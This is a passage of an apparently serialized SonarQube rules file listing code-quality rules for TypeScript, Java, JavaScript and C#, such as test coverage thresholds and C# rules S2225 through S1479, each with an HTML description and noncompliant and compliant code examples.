  if (price &lt; 0 || price &gt; MAX_PRICE) {
    throw new IllegalArgumentException("Invalid price: " + price);
  }
  // Set the price
 }
</pre>
<h2>See</h2>
<p><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/language/assert.html">Programming With Assertions</a></p>Z
CODE_SMELL
¨
common-ts:FailedUnitTestsé
	common-tsFailedUnitTests!Failed unit tests should be fixed"MAJOR*ts:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
Ì
common-ts:DuplicatedBlocksŒ
	common-tsDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*ts:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
â
common-ts:SkippedUnitTestsÍ
	common-tsSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*ts:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL
ó
$common-ts:InsufficientCommentDensityÓ
	common-tsInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*ts:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
◊
"common-ts:InsufficientLineCoverage∞
	common-tsInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*ts:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
„
$common-ts:InsufficientBranchCoverage∫
	common-tsInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*ts:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
≤
common-java:FailedUnitTestsí
common-javaFailedUnitTests!Failed unit tests should be fixed"MAJOR*java:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
Û
common-java:DuplicatedBlocks“
common-javaDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*java:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
è
common-java:SkippedUnitTestsÓ
common-javaSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*java:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL
ù
&common-java:InsufficientCommentDensityÚ
common-javaInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*java:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
›
$common-java:InsufficientLineCoverage¥
common-javaInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*java:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
È
&common-java:InsufficientBranchCoverageæ
common-javaInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*java:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
¨
common-js:FailedUnitTestsé
	common-jsFailedUnitTests!Failed unit tests should be fixed"MAJOR*js:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
â
common-js:SkippedUnitTestsÍ
	common-jsSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*js:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL
Ì
common-js:DuplicatedBlocksŒ
	common-jsDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*js:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
ó
$common-js:InsufficientCommentDensityÓ
	common-jsInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*js:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
◊
"common-js:InsufficientLineCoverage∞
	common-jsInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*js:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
„
$common-js:InsufficientBranchCoverage∫
	common-jsInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*js:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
¨
common-cs:FailedUnitTestsé
	common-csFailedUnitTests!Failed unit tests should be fixed"MAJOR*cs:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
â
common-cs:SkippedUnitTestsÍ
	common-csSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*cs:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL
Ì
common-cs:DuplicatedBlocksŒ
	common-csDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*cs:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
ó
$common-cs:InsufficientCommentDensityÓ
	common-csInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*cs:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
„
$common-cs:InsufficientBranchCoverage∫
	common-csInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*cs:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
◊
"common-cs:InsufficientLineCoverage∞
	common-csInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*cs:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
õ
csharpsquid:S2225Ö
csharpsquidS2225*"ToString()" method should not return null"MAJOR*cs:≤<p>Calling <code>ToString()</code> on an object should always return a string. Returning <code>null</code> instead contravenes the method's implicit
contract.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public override string ToString ()
{
  if (this.collection.Count == 0)
  {
    return null; // Noncompliant
  }
  else
  {
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public override string ToString ()
{
  if (this.collection.Count == 0)
  {
    return string.Empty;
  }
  else
  {
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwDOAQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required
  </li>
</ul>ZBUG
Ω
csharpsquid:S2589ß
csharpsquidS2589,Boolean expressions should not be gratuitous"MAJOR*cs:À
<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = true;
if (a) // Noncompliant
{
  DoSomething();
}

if (b &amp;&amp; a) // Noncompliant; "a" is always "true"
{
  DoSomething();
}

if (c || !a) // Noncompliant; "!a" is always "false"
{
  DoSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a = true;
if (Foo(a))
{
  DoSomething();
}

if (b)
{
  DoSomething();
}

if (c)
{
  DoSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
‰
csharpsquid:S1134Œ
csharpsquidS1134Track uses of "FIXME" tags"MAJOR*cs:Ñ<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private int Divide(int numerator, int denominator)
{
    return numerator / denominator;  // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
∞
csharpsquid:S3431ö
csharpsquidS3431("[ExpectedException]" should not be used"MAJOR*cs:¬<p>It should be clear to a casual reader what code a test is testing and what results are expected. Unfortunately, that's not usually the case with
the <code>[ExpectedException]</code> attribute since an exception could be thrown from almost any line in the method.</p>
<p>This rule detects MSTest and NUnit <code>ExpectedException</code> attribute.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[TestMethod]
[ExpectedException(typeof(ArgumentNullException))]  // Noncompliant
public void TestNullArg()
{
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[TestMethod]
public void TestNullArg()
{
  bool callFailed = false;
  try
  {
    //...
  }
  catch (ArgumentNullException)
  {
    callFailed = true;
  }
  Assert.IsTrue(callFailed, "Expected call to MyMethod to fail with ArgumentNullException");
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores one-line test methods, since it is obvious in such methods where the exception is expected to be thrown. </p>Z
CODE_SMELL
·

csharpsquid:S2583À

csharpsquidS25831Conditionally executed blocks should be reachable"MAJOR*cs:Ò	<p>Conditional expressions which are always <code>true</code> or <code>false</code> can lead to dead code. Such code is always buggy and should never
be used in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = false;
if (a) // Noncompliant
{
  DoSomething(); // never executed
}

if (!a || b) // Noncompliant; "!a" is always "true", "b" is never evaluated
{
  DoSomething();
}
else
{
  DoSomethingElse(); // never executed
}
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue in either of these cases:</p>
<ul>
  <li> When the condition is a single <code>const bool</code> </li>
</ul>
<pre>
const bool debug = false;
//...
if (debug)
{
  // Print something
}
</pre>
<ul>
  <li> When the condition is the literal <code>true</code> or <code>false</code>. </li>
</ul>
<p>In these cases it is obvious the code is as intended.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
¥
csharpsquid:S2357û
csharpsquidS2357Fields should be private"MAJOR*cs:÷<p>Fields should not be part of an API, and therefore should always be private. Indeed, they cannot be added to an interface for instance, and
validation cannot be added later on without breaking backward compatibility. Instead, developers should encapsulate their fields into properties.
Explicit property getters and setters can be introduced for validation purposes or to smooth the transition to a newer system.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  public int MagicNumber = 42;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  public int MagicNumber
  {
    get { return 42; }
  }
}
</pre>
<p>or </p>
<pre>
public class Foo
{
  private int MagicNumber = 42;
}
</pre>
<h2>Exceptions</h2>
<p><code>struct</code>s are ignored, as are <code>static</code> and <code>const</code> fields in classes. </p>
<p>Further, an issue is only raised when the real accessibility is <code>public</code>, taking into account the class accessibility.</p>Z
CODE_SMELL
˛
csharpsquid:S2234Ë
csharpsquidS22340Parameters should be passed in the correct order"MAJOR*cs:à<p>When the names of parameters in a method call match the names of the method arguments, it contributes to clearer, more readable code. However, when
the names match, but are passed in a different order than the method arguments, it indicates a mistake in the parameter order which will likely lead
to unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public double Divide(int divisor, int dividend)
{
    return divisor/dividend;
}

public void DoTheThing()
{
    int divisor = 15;
    int dividend = 5;

    double result = Divide(dividend, divisor);  // Noncompliant; operation succeeds, but result is unexpected
    //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public double Divide(int divisor, int dividend)
{
    return divisor/dividend;
}

public void DoTheThing()
{
    int divisor = 15;
    int dividend = 5;

    double result = Divide(divisor, dividend);
    //...
}
</pre>Z
CODE_SMELL
§
csharpsquid:S1145é
csharpsquidS1145FUseless "if(true) {...}" and "if(false){...}" blocks should be removed"MAJOR*cs:ü
<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true)
{
  DoSomething();
}
...
if (false)
{
  DoSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
DoSomething();
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=csharpsquid%3AS2583'>S2583</a> instead.</p>ZBUG
Ì

csharpsquid:S2114◊

csharpsquidS2114BCollections should not be passed as arguments to their own methods"MAJOR*cs:Ï	<p>Passing a collection as an argument to the collection's own method is either an error - some other argument was intended - or simply nonsensical
code. </p>
<p>Further, because some methods require that the argument remain unmodified during the execution, passing a collection to itself can result in an
unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
var list = new List&lt;int&gt;();

list.AddRange(list); // Noncompliant
list.Concat(list); // Noncompliant

list.Union(list); // Noncompliant; always returns list
list.Except(list); // Noncompliant; always empty
list.Intersect(list); // Noncompliant; always list
list.SequenceEqual(list); // Noncompliant; always true

var set = new HashSet&lt;int&gt;();
set.UnionWith(set); // Noncompliant; no changes
set.ExceptWith(set); // Noncompliant; always empty
set.IntersectWith(set); // Noncompliant; no changes
set.IsProperSubsetOf(set); // Noncompliant; always false
set.IsProperSupersetOf(set); // Noncompliant; always false
set.IsSubsetOf(set); // Noncompliant; always true
set.IsSupersetOf(set); // Noncompliant; always true
set.Overlaps(set); // Noncompliant; always true
set.SetEquals(set); // Noncompliant; always true
set.SymmetricExceptWith(set); // Noncompliant; always empty
</pre>ZBUG
ù
csharpsquid:S3445á
csharpsquidS3445,Exceptions should not be explicitly rethrown"MAJOR*cs:´<p>When rethrowing an exception, you should do it by simply calling <code>throw;</code> and not <code>throw exc;</code>, because the stack trace is
reset with the second syntax, making debugging a lot harder.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try
{}
catch(ExceptionType1 exc)
{
  Console.WriteLine(exc);
  throw exc; // Noncompliant; stacktrace is reset
}
catch (ExceptionType2 exc)
{
  throw new Exception("My custom message", exc);  // Compliant; stack trace preserved
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try
{}
catch(ExceptionType1 exc)
{
  Console.WriteLine(exc);
  throw;
}
catch (ExceptionType2 exc)
{
  throw new Exception("My custom message", exc);
}
</pre>Z
CODE_SMELL
û
csharpsquid:S1144à
csharpsquidS11441Unused private types or members should be removed"MAJOR*cs:ß
<p><code>private</code> or <code>internal</code> types or <code>private</code> members that are never executed or referenced are dead code:
unnecessary, inoperative code that should be removed. Cleaning out dead code decreases the size of the maintained codebase, making it easier to
understand the program and preventing bugs from being introduced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
    private void UnusedPrivateMethod() {...} // Noncompliant

    private class UnusedClass {...} // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
    public Foo()
    {
        UsedPrivateMethod();
    }

    private void UsedPrivateMethod()
    {
        var c = new UsedClass();
    }

    private class UsedClass {...}
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise issues on:</p>
<ul>
  <li> Empty constructors </li>
  <li> Attributed members </li>
  <li> <code>Main</code> method </li>
  <li> Methods with event handler signature <code>void Foo(object, EventArgs)</code> that are declared in partial class </li>
  <li> Empty serialization constructor on type with <code>System.SerializableAttribute</code> attribute. </li>
  <li> Internals in assemblies that have a <code>System.Runtime.CompilerServices.InternalsVisibleToAttribute</code> attribute. </li>
</ul>Z
CODE_SMELL
á
csharpsquid:S3442Ò
csharpsquidS34428"abstract" classes should not have "public" constructors"MAJOR*cs:â<p>Since <code>abstract</code> classes can't be instantiated, there's no point in their having <code>public</code> or <code>internal</code>
constructors. If there is basic initialization logic that should run when an extending class instance is created, you can by all means put it in a
constructor, but make that constructor <code>private</code> or <code>protected</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
abstract class Base
{
    public Base() // Noncompliant, should be private or protected
    {
      //...
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
abstract class Base
{
    protected Base()
    {
      //...
    }
}
</pre>Z
CODE_SMELL
¸

csharpsquid:S881Á

csharpsquidS881~Increment (++) and decrement (--) operators should not be used in a method call or mixed with other operators in an expression"MAJOR*cs:∫	<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>
<ul>
  <li> It can significantly impair the readability of the code. </li>
  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>
  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
u8a = ++u8b + u8c--;
foo = bar++ / 4;
</pre>
<h2>Compliant Solution</h2>
<p>The following sequence is clearer and therefore safer:</p>
<pre>
++u8b;
u8a = u8b + u8c;
u8c--;
foo = bar / 4;
bar++;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwE">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/fYAyAQ">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side
  effects </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/yQC7AQ">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the
  same object within an expression </li>
</ul>Z
CODE_SMELL
≈
csharpsquid:S3655Ø
csharpsquidS3655+Empty nullable value should not be accessed"MAJOR*cs:€<p>Nullable value types can hold either a value or <code>null</code>. The value held in the nullable type can be accessed with the <code>Value</code>
property, but <code>.Value</code> throws an <code>InvalidOperationException</code> when the value is <code>null</code>. To avoid the exception, a
nullable type should always be tested before <code>.Value</code> is accessed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int? nullable = null;
...
UseValue(nullable.Value); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int? nullable = null;
...
if (nullable.HasValue)
{
  UseValue(nullable.Value);
}
</pre>
<p>or</p>
<pre>
int? nullable = null;
...
if (nullable != null)
{
  UseValue(nullable.Value);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/476.html">MITRE, CWE-476</a> - NULL Pointer Dereference </li>
</ul>ZBUG
ô
csharpsquid:S3898É
csharpsquidS3898,Value types should implement "IEquatable<T>""MAJOR*cs:ß<p>If you're using a <code>struct</code>, it is likely because you're interested in performance. But by failing to implement
<code>IEquatable&lt;T&gt;</code> you're loosing performance when comparisons are made because without <code>IEquatable&lt;T&gt;</code>, boxing and
reflection are used to make comparisons. </p>
<h2>Noncompliant Code Example</h2>
<pre>
struct MyStruct  // Noncompliant
{
  private int i;
  public int I
  {
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
struct MyStruct : IEquatable&lt;MyStruct&gt;
{
  private int i;
  public int I
  {
    //...
  }

  public bool Equals(MyStruct other)
  {
    throw new NotImplementedException();
  }
}
</pre>Z
CODE_SMELL
í	
csharpsquid:S2688¸
csharpsquidS2688'"NaN" should not be used in comparisons"MAJOR*cs:¨<p><code>NaN</code> is not equal to anything, even itself. Testing for equality or inequality against <code>NaN</code> will yield predictable results,
but probably not the ones you want. </p>
<p>Instead, the best way to see whether a variable is equal to <code>NaN</code> is to use <code>Number.isNaN()</code>, since ES2015, or (perhaps
counter-intuitively) to compare it to itself. Since <code>NaN !== NaN</code>, when <code>a !== a</code>, you know it must equal <code>NaN</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var a = double.NaN;

if (a == double.NaN) // Noncompliant; always false
{
  Console.WriteLine("a is not a number");  // this is dead code
}
if (a != double.NaN)  // Noncompliant; always true
{
  Console.WriteLine("a is not NaN"); // this statement is not necessarily true
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (double.IsNaN(a))
{
  console.log("a is not a number");
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7AEqAQ">CERT, NUM07-J.</a> - Do not attempt comparisons with NaN </li>
</ul>ZBUG
Å
csharpsquid:S2201Î
csharpsquidS2201GReturn values from functions without side effects should not be ignored"MAJOR*cs:˚<p>When the call to a function doesn't have any side effects, what is the point of making the call if the results are ignored? In such case, either
the function call is useless and should be dropped or the source code doesn't behave as expected.</p>
<p>This rule raises an issue when the results of the following methods are ignored:</p>
<ul>
  <li> LINQ method, </li>
  <li> <code>[Pure]</code> method, </li>
  <li> any method on <code>string</code>, <code>int</code>, ..., <code>System.Collections.Immutable.ImmutableArray&lt;T&gt;</code>,
  <code>ImmutableHashSet&lt;T&gt;</code>, ... </li>
</ul>
<p>Note: although <code>string.Intern</code> has a side effect, ignoring its return value is still suspicious as it is the only reference ensured to
point to the intern pool.</p>
<h2>Noncompliant Code Example</h2>
<pre>
coll.Where(i =&gt; i &gt; 5).Select(i =&gt; i*i); // Noncompliant
"this string".Equals("other string"); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var res = coll.Where(i =&gt; i &gt; 5).Select(i =&gt; i*i);
var isEqual = "this string".Equals("other string");
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't report issues on method calls with <code>out</code> or <code>ref</code> arguments.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9YIRAQ">CERT, EXP12-C.</a> - Do not ignore values returned by functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9gEqAQ">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>
</ul>ZBUG
ﬁ
csharpsquid:S1110»
csharpsquidS11100Redundant pairs of parentheses should be removed"MAJOR*cs:Ë<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a &amp;&amp; ((x + y &gt; 0))) // Noncompliant
{
  //...
}

return ((x + 1));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a &amp;&amp; (x + y &gt; 0))
{
  //...
}

return x + 1;

return (x + 1);
</pre>Z
CODE_SMELL
´
csharpsquid:S2681ï
csharpsquidS26813Multiline blocks should be enclosed in curly braces"MAJOR*cs:≤<p>Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be
misleading and induce bugs. </p>
<p>This rule raises an issue when the whitespacing of the lines after a one line block indicates an intent to include those lines in the block, but
the omission of curly braces means the lines will be unconditionally executed once.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)
  FirstActionInBlock();
  SecondAction();  // Noncompliant; executed unconditionally
ThirdAction();

if(condition) FirstActionInBlock(); SecondAction();  // Noncompliant; secondAction executed unconditionally

if(condition) FirstActionInBlock();  // Noncompliant
  SecondAction();  // Executed unconditionally

string str = null;
for (int i = 0; i &lt; array.Length; i++)
  str = array[i];
  DoTheThing(str);  // Noncompliant; executed only on last array element
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition)
{
  FirstActionInBlock();
  SecondAction();
}
ThirdAction();

string str = null;
for (int i = 0; i &lt; array.Length; i++)
{
  str = array[i];
  DoTheThing(str);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/3wHEAw">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>Z
CODE_SMELL
∏
csharpsquid:S1118¢
csharpsquidS11183Utility classes should not have public constructors"MAJOR*cs:ø<p>Utility classes, which are collections of <code>static</code> members, are not meant to be instantiated.</p>
<p>C# adds an implicit public constructor to every class which does not explicitly define at least one constructor. Hence, at least one
<code>protected</code> constructor should be defined if you wish to subclass this utility class. Or the <code>static</code> keyword should be added to
the class declaration to prevent subclassing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class StringUtils // Noncompliant
{
  public static string Concatenate(string s1, string s2)
  {
    return s1 + s2;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static class StringUtils
{
  public static string Concatenate(string s1, string s2)
  {
    return s1 + s2;
  }
}
</pre>
<p>or</p>
<pre>
public class StringUtils
{
  protected StringUtils()
  {
  }
  public static string Concatenate(string s1, string s2)
  {
    return s1 + s2;
  }
}
</pre>Z
CODE_SMELL
◊
csharpsquid:S1117¡
csharpsquidS1117.Local variables should not shadow class fields"MAJOR*cs:„<p>Overriding or shadowing a variable declared in an outer scope can strongly impact the readability, and therefore the maintainability, of a piece of
code. Further, it could lead maintainers to introduce bugs because they think they're using one variable but are really using another.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo
{
  public int myField;

  public void DoSomething()
  {
    int myField = 0;  // Noncompliant
    ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/DCL01-C.+Do+not+reuse+variable+names+in+subscopes">CERT, DCL01-C.</a> - Do not reuse
  variable names in subscopes </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/DCL51-J.+Do+not+shadow+or+obscure+identifiers+in+subscopes">CERT, DCL51-J.</a> - Do
  not shadow or obscure identifiers in subscopes </li>
</ul>Z
CODE_SMELL
Ö
csharpsquid:S2326Ô
csharpsquidS2326(Unused type parameters should be removed"MAJOR*cs:ó<p>Type parameters that aren't used are dead code, which can only distract and possibly confuse developers during maintenance. Therefore, unused type
parameters should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MoreMath&lt;T&gt;   // Noncompliant; &lt;T&gt; is ignored
{
  public int Add&lt;T&gt;(int a, int b) // Noncompliant; &lt;T&gt; is ignored
  {
    return a + b;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MoreMath
{
  public int Add (int a, int b)
  {
    return a + b;
  }
}
</pre>Z
CODE_SMELL
˛
csharpsquid:S3415Ë
csharpsquidS34159Assertion arguments should be passed in the correct order"MAJOR*cs:ˇ<p>The standard assertions library methods such as <code>AreEqual</code> and <code>AreSame</code> in <strong>MSTest</strong> and
<strong>NUnit</strong>, or <code>Equal</code> and <code>Same</code> in <strong>XUnit</strong>, expect the first argument to be the expected value and
the second argument to be the actual value. Swap them, and your test will still have the same outcome (succeed/fail when it should) but the error
messages will be confusing. </p>
<p>This rule raises an issue when the second argument to an assertions library method is a hard-coded value and the first argument is not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Assert.AreEqual(runner.ExitCode, 0, "Unexpected exit code");  // Noncompliant; Yields error message like: Expected:&lt;-1&gt;. Actual:&lt;0&gt;.
</pre>
<h2>Compliant Solution</h2>
<pre>
Assert.AreEqual(0, runner.ExitCode, "Unexpected exit code");
</pre>Z
CODE_SMELL
É
csharpsquid:S1479Ì
csharpsquidS1479;"switch" statements should not have too many "case" clauses"MAJOR*cs:Ç<p>When <code>switch</code> statements have large sets of case clauses, it is usually an attempt to map two sets of data. A <code>Dictionary</code>
should be used instead to make the code more readable and maintainable.</p>
<h2>Noncompliant Code Example</h2>
<p>With a "Maximum number of case" set to 4</p>
<pre>
public class TooManyCase
{
    public int switchCase(char ch)
    {
        switch(ch) {  // Noncompliant
            case 'a':
                return 1;
            case 'b':
            case 'c':
                return 2;
            case 'd':
                return 3;
            case 'e':
                return 4;
            case 'f':
            case 'g':
            case 'h':
                return 5;
            default:
                return 6;
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System.Collections.Generic;

public class TooManyCase
{
    Dictionary&lt;char, int&gt; matching = new Dictionary&lt;char, int&gt;()
    {
        {'a', 1}, {'b', 2}, {'c', 2}, {'d', 3},
        {'e', 4}, {'f', 5}, {'g', 5}, {'h', 5}
    };

    public int withDictionary(char ch)
    {
        int value;
        if (this.matching.TryGetValue(ch, out value)) {
            return value;
        } else {
            return 6;
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores <code>switch</code>es over <code>Enum</code>s and empty, fall-through cases.</p>Z
CODE_SMELL
‰	
csharpsquid:S2327Œ	
